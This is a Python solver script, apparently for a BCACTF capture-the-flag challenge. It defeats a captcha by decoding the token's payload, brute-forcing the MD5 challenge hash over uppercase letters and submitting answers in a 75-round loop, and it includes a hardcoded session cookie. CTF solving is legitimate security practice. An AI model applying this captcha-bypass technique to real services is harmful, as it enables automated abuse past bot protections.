import base64
import hashlib
import itertools
import json
import os
import time

import requests

url = "http://challs.bcactf.com:30477/captcha"
cookie = {'session': "eyJkYiI6IjU5ZDg1NmM1MWMyNjBmOTVhZDEzM2ZhMjZlNmM3NThmIiwicm9sZV90YWJsZSI6InJvbGVzX2Q4ZTIwNWVkYjgxOTE4YjMifQ.ZmRbZg.iLmxKh5IrBVRXbDwiFMpNz25ckg"}
cache_file = "generated_hashes.json"

def load_cache():
    if os.path.exists(cache_file):
        with open(cache_file, 'r') as f:
            return json.load(f)
    return {}

def save_cache(cache):
    with open(cache_file, 'w') as f:
        json.dump(cache, f)

def get_md5():
    try:
        r = requests.post(url, json={"routeId": "/flag"}, cookies=cookie)
        r.raise_for_status()
    except requests.RequestException as e:
        print(f"Error fetching MD5 hash: {e}")
        return None, None, None

    token = r.json().get("captchaToken")
    if not token:
        print("Invalid response, no captchaToken found.")
        return None, None, None

    b64_string = token.split(".")[1]
    decoded_bytes = base64.b64decode(b64_string + '=' * (-len(b64_string) % 4))
    decoded_string = json.loads(decoded_bytes.decode('utf-8'))
    print(decoded_string)

    md5_hash = decoded_string.get("challengeId")
    expired = decoded_string.get("exp")

    return md5_hash, token, expired

def send_captcha(captcha_word, captcha_token=None, expired_time=None):
    if expired_time and time.time() > expired_time:
        print("Token expired")
        return main()

    try:
        r = requests.post(url, json={"captchaToken": captcha_token, "word": captcha_word}, cookies=cookie)
        r.raise_for_status()
    except requests.RequestException as e:
        print(f"Error sending captcha: {e}")
        return main()

    if "expired" in r.text:
        print("Token expired, retrying...")
        return main()

    token = r.json().get("captchaToken")
    if not token:
        print("Invalid response, no new captchaToken found.")
        return None, None, None

    b64_string = token.split(".")[1]
    decoded_bytes = base64.b64decode(b64_string + '=' * (-len(b64_string) % 4))
    decoded_string = json.loads(decoded_bytes.decode('utf-8'))
    print(decoded_string, "- Token {} = {}".format(token, captcha_word) )

    md5_hash = decoded_string.get("challengeId")
    expired = decoded_string.get("exp")

    return md5_hash, token, expired

def compute_md5(s):
    return hashlib.md5(s.encode('utf-8')).hexdigest()

def brute_force_search(md5_hash, chrs):
    for n in range(1, 32):
        for xs in itertools.product(chrs, repeat=n):
            candidate = ''.join(xs)
            if compute_md5(candidate) == md5_hash:
                return candidate
    return None

def brute(md5_hash, cache):
    if md5_hash in cache:
        print(f"Found cached solution for {md5_hash}: {cache[md5_hash]}")
        return cache[md5_hash]

    chrs = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    word = brute_force_search(md5_hash, chrs)
    
    if word:
        cache[md5_hash] = word
        save_cache(cache)

    return word

def main():
    cache = load_cache()
    md5_hash, token, expired = get_md5()
    if not md5_hash or not token:
        print("Failed to retrieve initial MD5 hash and token.")
        return

    for _ in range(75):
        word = brute(md5_hash, cache)
        if not word:
            print("Failed to brute-force the captcha.")
            return

        md5_hash, token, expired = send_captcha(word, token, expired)
        if not md5_hash or not token:
            print("Failed to retrieve new MD5 hash and token.")
            return

if __name__ == "__main__":
    main()
